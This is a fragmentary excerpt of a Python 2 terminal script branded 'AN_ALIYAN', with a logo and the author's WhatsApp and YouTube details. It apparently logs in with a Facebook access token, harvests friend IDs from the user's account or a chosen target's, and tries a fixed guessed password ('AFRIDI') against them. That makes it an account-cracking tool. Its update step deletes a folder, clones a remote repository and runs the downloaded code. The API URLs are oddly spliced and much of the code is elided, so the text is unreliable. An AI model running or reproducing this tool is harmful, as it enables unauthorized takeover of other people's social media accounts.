...
logo='''
\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
\033[1;94m ┈┈┈▕▕AN AN▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕AN AN▏▏┈┈┈
\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
...
\033[1;91m☞ Auther     : AN_ALiYAN_AN_MASTER
\033[1;92m☞ WhatsApp   : 03130096588
\033[1;95m☞ YouTube    : https://youtube.com/channel/U2yilyKkZLM
...
def login():
	...
	try:
		...
		if 'access_token' in z:
		    ...
		    os.system('xdg-open https://youtube.com/channel/U2yilyKkZLM')
		    menu()
		else:
...
def menu():
	...
	try:
		...
		login()
	try:
		otw=requests.get('https://www.facebook.com/aliyan.ahmmad.5/me?access_token='+tb)
	...
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update A4N_ALIYAN Tool')
	print (S + '[' + P + '☞3' + S + ']' + S + ' AN_ALIYAN WhatsApp Group')
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf $HOME/AN_ALIYAN')
	    os.system('cd $HOME && git clone https://github.com/ALIYAN/Aliyan')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    ...
	    psb('WellCome To AN_ALIYAN')
	    psb('Congratulations AN_ALIYAN Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ ALIYAN✓')
	    psb('🔓Password ☆ AFRIDI✓')
	    psb('Subscrib My Youtube Channel AN ALIYAN AN MASTER✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $HOME/AN_ALIYAN && python2 AN.py')
	elif bm =='3':
...
def pb():
	...
	if bp =='':
		...
		cb()
		print (logo)
		r=requests.get('https://www.facebook.com/aliyan.ahmmad.5/me/friends?access_token='+tb)
		z=json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif bp=='2':
		...
		print (logo)
		try:
			jok=requests.get('https://www.facebook.com/aliyan.ahmmad.5/'+idt+'?access_token='+tb)
			...
			raw_input(R + ' Back')
			pak()
		r=requests.get('https://www.facebook.com/aliyan.ahmmad.5/'+idt+'/friends?access_token='+tb)
		z=json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif bp =='3':
	...
	def main(arg):
		...
		user=arg
		try:
			h=requests.get('https://www.facebook.com/aliyan.ahmmad.5/'+user+'/?access_token='+tb)
			j=json.loads(h.text)
			ps1=('AFRIDI')
